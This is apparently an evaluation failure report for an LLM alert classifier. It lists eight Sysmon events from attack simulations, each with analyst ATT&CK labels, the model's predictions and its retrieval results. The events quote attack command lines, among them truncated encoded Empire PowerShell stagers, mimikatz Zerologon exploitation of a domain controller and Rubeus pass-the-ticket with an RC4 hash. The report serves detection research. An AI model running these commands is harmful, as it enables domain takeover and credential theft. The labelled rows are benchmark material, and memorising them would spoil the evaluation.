# Failures: rag

8 failures out of 30 rows (dev; 0 transport errors skipped). Model openrouter:nvidia/nemotron-3-super-120b-a12b:free, prompt 2edd88418b70, labels b0695a44d0d4.

Hints (guesses, not buckets): reasoning error? 1, retrieval miss? 7

---
### day3-176  (technique credit 0.25)

**hint:** reasoning error?  
**bucket:** _retrieval miss | reasoning error | schema error | label error_  
**note:** 

**Alert:** Atomic capture — manual review (medium), source dataset `empire_psexec_dcerpc_tcp_svcctl.zip`

Event 0:
- source `windows_sysmon`, host `WORKSTATION6.theshire.local`, user `NT AUTHORITY\SYSTEM`
- process `C:\Windows\System32\cmd.exe`
- command line `C:\windows\system32\cmd.exe /C start /b C:\Windows\System32\WindowsPowershell\v1.0\powershell -noP -sta -w 1 -enc  SQBmACgAJABQAFMAVgBFAHIAUwBpAE8AbgBUAGEAYgBsAEUALgBQAFMAVgBFAFIAcwBJAE8AbgAuAE0AYQBqAG8AcgAgAC0ARwBFACAAMwApAHsAJAA0ADMARABlADIAPQBbAHIARQBGAF0ALgBBAFMAcwBlAE0AQgBsAHkALgBHAEUAVABUAFkAcABlACgAJwBTAHkAcwB0AGUAbQAuAE0AYQBuAGEAZwBlAG0AZQBuAHQALgBBAHUAdABvAG0AYQB0AGkAbwBuAC4AVQB0AGkAbABzACcAKQAuACIARwBFAHQARgBJAEUAYABsAGQAIgAoACcAYwBhAGMAaABlAGQARwByAG8AdQBwAFAAbwBsAGkAYwB5AFMAZQB0AHQAaQBuAGcAcwAnACwAJwBOACcAKwAnAG8AbgBQAHUAYgBsAGkAYwAsAFMAdABhAHQAaQBjACcAKQA7AEkARgAoACQANAAzAEQARQAyA... (+4599)`
- parent `C:\Windows\System32\services.exe` `C:\windows\system32\services.exe`

**Label:** true_positive ['T1569.002'] by `Mouadh`: cmd.exe started by services.exe running 'start /b powershell -enc' is a remote service executing an encoded stager (PsExec-style).
**Model:** true_positive ['T1059.003', 'T1059.001'] (confidence 0.95), tier 1
**Technique credit:** 0.25

> The event shows cmd.exe (image: C:/Windows/System32/cmd.exe) launched by services.exe with a command line containing an encoded PowerShell payload (-enc ...), indicating adversarial use of the Windows command shell to execute obfuscated PowerShell, consistent with execution technique T1059.003 and PowerShell usage T1059.001.

**Retrieved techniques (top 5):** ['T1059.003', 'T1543.003', 'T1543', 'T1569.002', 'T1202']  
**Retrieved Sigma rules:** ['79f4ede3-402e-41c8-bc3e-ebbf5f162581', '17a1be64-8d88-40bf-b5ff-a4f7a50ebcc8', 'ab37a6ec-6068-432b-a64e-2c7bf95b1d22', '138d3531-8793-4f50-a2cd-f291b2863d78', '5a6b7c8d-9e0f-1a2b-3c4d-5e6f7a8b9c0d']
**Trace:** https://cloud.langfuse.com/project/cmub63msw005had0chtdazpl6/traces/b2c04c19c6995c01baa74ee344227cf7

---

### day3-071  (verdict needs_review != true_positive; technique credit 0.25)

**hint:** retrieval miss? (T1021.003 not in top 5)  
**bucket:** _retrieval miss | reasoning error | schema error | label error_  
**note:** 

**Alert:** Atomic capture — manual review (medium), source dataset `covenant_dcom_executeexcel4macro_allowed.zip`

Event 0:
- source `windows_sysmon`, host `WORKSTATION5.theshire.local`, user `THESHIRE\pgustavo`
- process `C:\Users\pgustavo\Desktop\MoveExcel4.exe`
- command line `C:\Users\pgustavo\Desktop\MoveExcel4.exe  172.18.39.6`
- parent `C:\Windows\System32\cmd.exe` `"cmd.exe" /c C:\Users\pgustavo\Desktop\MoveExcel4.exe 172.18.39.6`

**Label:** true_positive ['T1021.003'] by `Mouadh`: MoveExcel4.exe <IP> uses DCOM to run an Excel 4.0 macro on a remote host.
**Model:** needs_review ['T1204.002', 'T1570'] (confidence 0.65), tier 2, escalated: confidence 0.60 < 0.7
**Technique credit:** 0.25

> A custom executable named MoveExcel4.exe runs from a user's Desktop with an internal IP address (172.18.39.6) as a command-line argument. The filename suggests Excel-related functionality but the IP argument implies network connectivity, which is atypical for legitimate desktop utilities. Parent process is cmd.exe. No hash or reputation data is available in the event. The behavior could represent a user-run admin script, a lateral-movement tool (T1570), or a malicious file executed by the user (T1204.002), but a single process creation without follow-on telemetry is insufficient to confirm adversary activity.

**Retrieved techniques (top 5):** ['T1546.008', 'T1570', 'T1574.008', 'T1204.002', 'T1059.003']  
**Retrieved Sigma rules:** ['a16980c2-0c56-4de0-9a79-17971979efdd', '502b42de-4306-40b4-9596-6f590c81f073', '1c0e41cd-21bb-4433-9acc-4a2cd6367b9b', 'fff9d2b7-e11c-4a69-93d3-40ef66189767', '10c14723-61c7-4c75-92ca-9af245723ad2']
**Trace:** https://cloud.langfuse.com/project/cmub63msw005had0chtdazpl6/traces/68a091a8e54d9f9e3b8d4489a6fb8643

---

### day3-166  (verdict needs_review != true_positive)

**hint:** retrieval miss? (T1021.003 not in top 5)  
**bucket:** _retrieval miss | reasoning error | schema error | label error_  
**note:** 

**Alert:** Atomic capture — manual review (medium), source dataset `covenant_dcom_executeexcel4macro_blocked.zip`

Event 0:
- source `windows_sysmon`, host `WORKSTATION5.theshire.local`, user `THESHIRE\pgustavo`
- process `C:\Users\pgustavo\Desktop\MoveExcel4.exe`
- command line `C:\Users\pgustavo\Desktop\MoveExcel4.exe  172.18.39.6`
- parent `C:\Windows\System32\cmd.exe` `"cmd.exe" /c C:\Users\pgustavo\Desktop\MoveExcel4.exe 172.18.39.6`

**Label:** true_positive ['T1021.003'] by `Mouadh`: MoveExcel4.exe <IP> attempts DCOM lateral movement by remote Excel 4.0 macro execution.
**Model:** needs_review ['T1570', 'T1021.003'] (confidence 0.65), tier 2, escalated: confidence 0.60 < 0.7
**Technique credit:** 1.00

> A custom-named executable (MoveExcel4.exe) on a user's Desktop is invoked via cmd.exe with a private IP address (172.18.39.6) as an argument. This pattern is consistent with a lateral movement tool transferring itself or connecting to another host, but the binary could also be a legitimate internal utility. No hash, network logs, or prior reputation are available to confirm malicious intent.

**Retrieved techniques (top 5):** ['T1546.008', 'T1570', 'T1574.008', 'T1204.002', 'T1059.003']  
**Retrieved Sigma rules:** ['a16980c2-0c56-4de0-9a79-17971979efdd', '502b42de-4306-40b4-9596-6f590c81f073', '1c0e41cd-21bb-4433-9acc-4a2cd6367b9b', 'fff9d2b7-e11c-4a69-93d3-40ef66189767', '10c14723-61c7-4c75-92ca-9af245723ad2']
**Trace:** https://cloud.langfuse.com/project/cmub63msw005had0chtdazpl6/traces/f470ea888908f04e26b5c8087072cc04

---

### day3-048  (technique credit 0.00)

**hint:** retrieval miss? (T1134 not in top 5)  
**bucket:** _retrieval miss | reasoning error | schema error | label error_  
**note:** 

**Alert:** Atomic capture — manual review (medium), source dataset `aptsimulator_cobaltstrike.zip`

Event 0:
- source `windows_sysmon`, host `WORKSTATION5`, user `WORKSTATION5\APT-Simulator`
- process `C:\TMP\CreateNamedPipe.exe`
- command line `"C:\TMP\CreateNamedPipe.exe"  MSSE-1337-server`
- parent `C:\Windows\System32\cmd.exe` `"C:\Windows\system32\cmd.exe" `

**Label:** true_positive ['T1134'] by `Mouadh`: CreateNamedPipe.exe creating a pipe named MSSE-1337-server matches the Cobalt Strike getsystem named-pipe pattern; the event shows the pipe, not the impersonation, so the parent technique.
**Model:** true_positive ['T1059.003'] (confidence 0.9), tier 1
**Technique credit:** 0.00

> The event shows a process launched from the temporary directory (C:/TMP/CreateNamedPipe.exe) via cmd.exe, with a suspicious argument (MSSE-1337-server), executed by a user labeled APT-Simulator, indicating adversarial use of the Windows command shell for execution.

**Retrieved techniques (top 5):** ['T1059.003', 'T1574.008', 'T1003.001', 'T1204.002', 'T1218.014']  
**Retrieved Sigma rules:** ['3c89a1e8-0fba-449e-8f1b-8409d6267ec8', 'a16980c2-0c56-4de0-9a79-17971979efdd', '8e0bb260-d4b2-4fff-bb8d-3f82118e6892', 'f53714ec-5077-420e-ad20-907ff9bb2958', '044ba588-dff4-4918-9808-3f95e8160606']
**Trace:** https://cloud.langfuse.com/project/cmub63msw005had0chtdazpl6/traces/48a106b4d2897831c9cb4b4f74ca975f

---

### day3-095  (verdict needs_review != true_positive; technique credit 0.00)

**hint:** retrieval miss? (T1190 not in top 5)  
**bucket:** _retrieval miss | reasoning error | schema error | label error_  
**note:** 

**Alert:** Atomic capture — manual review (medium), source dataset `proxylogon_ssrf_rce_poc.zip`

Event 0:
- source `windows_sysmon`, host `MXS01.azsentinel.local`, user `NT AUTHORITY\SYSTEM`
- process `C:\Windows\System32\cmd.exe`
- command line `cmd /c whoami`
- parent `C:\Windows\System32\inetsrv\w3wp.exe` `c:\windows\system32\inetsrv\w3wp.exe -ap "MSExchangeOWAAppPool" -v "v4.0" -c "C:\Program Files\Microsoft\Exchange Server\V15\bin\GenericAppPoolConfigWithGCServerEnabledFalse.config" -a \\.\pipe\iisipm8e72bd3c-90fe-435f-bda2-fdb8731bc136 -h "C:\inetpub\temp\apppools\MSExchangeOWAAppPool\MSExchangeOWAAppPool.config" -w "" -m 0`

**Label:** true_positive ['T1190'] by `Mouadh`: cmd /c whoami spawned by the IIS worker process w3wp.exe means code execution inside the web server, the ProxyLogon result.
**Model:** needs_review ['T1059.003', 'T1069.001'] (confidence 0.55), tier 2, escalated: confidence 0.55 < 0.7
**Technique credit:** 0.00

> A single 'cmd /c whoami' executed by w3wp.exe (Exchange OWA app pool) running as SYSTEM is ambiguous: it could be legitimate diagnostics or post-exploitation reconnaissance. No follow-on commands, network activity, or file writes are present to confirm malicious intent.

**Retrieved techniques (top 5):** ['T1559.002', 'T1218.014', 'T1505.002', 'T1574.014', 'T1218.003']  
**Retrieved Sigma rules:** ['797011dc-44f4-4e6f-9f10-a8ceefbe566b', 'b730a276-6b63-41b8-bcf8-55930c8fc6ee', '2617e7ed-adb7-40ba-b0f3-8f9945fe6c09', 'e4a6b256-3e47-40fc-89d2-7a477edd6915', 'a35f5a72-f347-4e36-8895-9869b0d5fc6d']
**Trace:** https://cloud.langfuse.com/project/cmub63msw005had0chtdazpl6/traces/31f447cc12d6f536d144e36322bd38c2

---

### day3-113  (technique credit 0.00)

**hint:** retrieval miss? (T1210 not in top 5)  
**bucket:** _retrieval miss | reasoning error | schema error | label error_  
**note:** 

**Alert:** Atomic capture — manual review (medium), source dataset `mimikatz_CVE-2020-1472_Unauthenticated_NetrServerAuthenticate2.zip`

Event 0:
- source `windows_sysmon`, host `WORKSTATION5.theshire.local`, user `THESHIRE\pgustavo`
- process `C:\Windows\System32\cmd.exe`
- command line `"cmd.exe" /c C:\Users\pgustavo\Downloads\mimikatz_trunk\x64\mimikatz.exe "lsadump::zerologon /target:MORDORDC.theshire.local /account:MORDORDC$ /exploit" exit`
- parent `C:\Users\pgustavo\Desktop\GruntHTTP.exe` `"C:\Users\pgustavo\Desktop\GruntHTTP.exe" `

**Label:** true_positive ['T1210'] by `Mouadh`: cmd.exe /c mimikatz.exe "lsadump::zerologon ... /exploit" spawned by GruntHTTP.exe, a Covenant C2 implant: the command line shows the Zerologon (CVE-2020-1472) exploit against a domain controller.
**Model:** true_positive ['T1003.001'] (confidence 0.95), tier 1
**Technique credit:** 0.00

> The event shows cmd.exe executing mimikatz with the zerologon exploit to extract credentials from a domain controller, which is clear credential access behavior. The parent process GruntHTTP.exe suggests a malicious beacon launching the attack.

**Retrieved techniques (top 5):** ['T1204.002', 'T1546.008', 'T1003.001', 'T1203', 'T1204']  
**Retrieved Sigma rules:** ['502b42de-4306-40b4-9596-6f590c81f073', '631b22a4-70f4-4e2f-9ea8-42f84d9df6d8', '5a6b7c8d-9e0f-1a2b-3c4d-5e6f7a8b9c0d', 'a642964e-bead-4bed-8910-1bb4d63e3b4d', '1dd05363-104e-4b4a-b963-196a534b03a1']
**Trace:** https://cloud.langfuse.com/project/cmub63msw005had0chtdazpl6/traces/2c3c2b57cae5793ab6c678aef663eb82

---

### day3-151  (technique credit 0.00)

**hint:** retrieval miss? (T1210 not in top 5)  
**bucket:** _retrieval miss | reasoning error | schema error | label error_  
**note:** 

**Alert:** Atomic capture — manual review (medium), source dataset `mimikatz_CVE-2020-1472_Unauthenticated_NetrServerAuthenticate2.zip`

Event 0:
- source `windows_sysmon`, host `WORKSTATION5.theshire.local`, user `THESHIRE\pgustavo`
- process `C:\Users\pgustavo\Downloads\mimikatz_trunk\x64\mimikatz.exe`
- command line `C:\Users\pgustavo\Downloads\mimikatz_trunk\x64\mimikatz.exe  "lsadump::zerologon /target:MORDORDC.theshire.local /account:MORDORDC$ /exploit" exit`
- parent `C:\Windows\System32\cmd.exe` `"cmd.exe" /c C:\Users\pgustavo\Downloads\mimikatz_trunk\x64\mimikatz.exe "lsadump::zerologon /target:MORDORDC.theshire.local /account:MORDORDC$ /exploit" exit`

**Label:** true_positive ['T1210'] by `Mouadh`: mimikatz lsadump::zerologon /target exploits CVE-2020-1472 (Zerologon) against a domain controller.
**Model:** true_positive ['T1003'] (confidence 0.95), tier 1
**Technique credit:** 0.00

> The event shows execution of Mimikatz from a user's Downloads directory with the lsadump::zerologon module targeting a domain controller, which is a clear adversarial credential‑access action using a known hacking tool.

**Retrieved techniques (top 5):** ['T1204.002', 'T1003.001', 'T1546.008', 'T1203', 'T1574.008']  
**Retrieved Sigma rules:** ['502b42de-4306-40b4-9596-6f590c81f073', 'a642964e-bead-4bed-8910-1bb4d63e3b4d', '5a6b7c8d-9e0f-1a2b-3c4d-5e6f7a8b9c0d', 'f26307d8-14cd-47e3-a26b-4b4769f24af6', '1dd05363-104e-4b4a-b963-196a534b03a1']
**Trace:** https://cloud.langfuse.com/project/cmub63msw005had0chtdazpl6/traces/2989d6edbfcc685b866b576e6858919d

---

### day3-145  (technique credit 0.00)

**hint:** retrieval miss? (T1550.003 not in top 5)  
**bucket:** _retrieval miss | reasoning error | schema error | label error_  
**note:** 

**Alert:** Atomic capture — manual review (medium), source dataset `empire_shell_rubeus_asktgt_ptt.zip`

Event 0:
- source `windows_sysmon`, host `WORKSTATION6.theshire.local`, user `THESHIRE\wardog`
- process `C:\Users\sbeavers\Desktop\Rubeus.exe`
- command line `"C:\users\sbeavers\Desktop\Rubeus.exe" asktgt /user:pgustavo /rc4:81d310fa34e6a56a31145445891bb7b8 /ptt`
- parent `C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe` `"C:\windows\System32\WindowsPowerShell\v1.0\powershell.exe" -noP -sta -w 1 -enc SQBGACgAJABQAFMAVgBlAHIAUwBpAG8ATgBUAGEAQgBsAEUALgBQAFMAVgBFAFIAUwBJAE8ATgAuAE0AYQBqAG8AUgAgAC0AZwBlACAAMwApAHsAJABDADYANwA9AFsAUgBlAEYAXQAuAEEAcwBTAEUAbQBiAGwAeQAuAEcARQB0AFQAWQBwAGUAKAAnAFMAeQBzAHQAZQBtAC4ATQBhAG4AYQBnAGUAbQBlAG4AdAAuAEEAdQB0AG8AbQBhAHQAaQBvAG4ALgBVAHQAaQBsAHMAJwApAC4AIgBHAGUAVABGAGkAZQBgAEwARAAiACgAJwBjAGEAYwBoAGUAZABHAHIAbwB1AHAAUABvAGwAaQBjAHkAUwBlAHQAdABpAG4AZwBzACcALAAnAE4AJwArACcAbwBuAFAAdQBiAGwAaQBjACwAUwB0AGEAdABpAGMAJwApADsASQBmACgAJABDADYANwApAHsAJAA2AEMANAA9ACQAQwA2ADcALgBHAGUAdABWAGEA... (+4512)`

**Label:** true_positive ['T1550.003'] by `Mouadh`: Rubeus asktgt with an RC4 hash and /ptt requests a Kerberos ticket and injects it into the session (pass-the-ticket).
**Model:** true_positive ['T1558.001'] (confidence 0.95), tier 1
**Technique credit:** 0.00

> The event shows execution of Rubeus.exe with asktgt /user:pgustavo /rc4:81d310fa34e6a56a31145445891bb7b8 /ptt, which requests a Kerberos TGT using a password hash and injects it, indicative of credential access via pass-the-ticket/overpass-the-hash.

**Retrieved techniques (top 5):** ['T1216.002', 'T1218.014', 'T1059.001', 'T1204.002', 'T1563.002']  
**Retrieved Sigma rules:** ['7ec2c172-dceb-4c10-92c9-87c1881b7e18', '79f4ede3-402e-41c8-bc3e-ebbf5f162581', '3268b746-88d8-4cd3-bffc-30077d02c787', '6385697e-9f1b-40bd-8817-f4a91f40508e', '87e3c4e8-a6a8-4ad9-bb4f-46e7ff99a180']
**Trace:** https://cloud.langfuse.com/project/cmub63msw005had0chtdazpl6/traces/84c62bf027e9e8b33827978cc328eafb
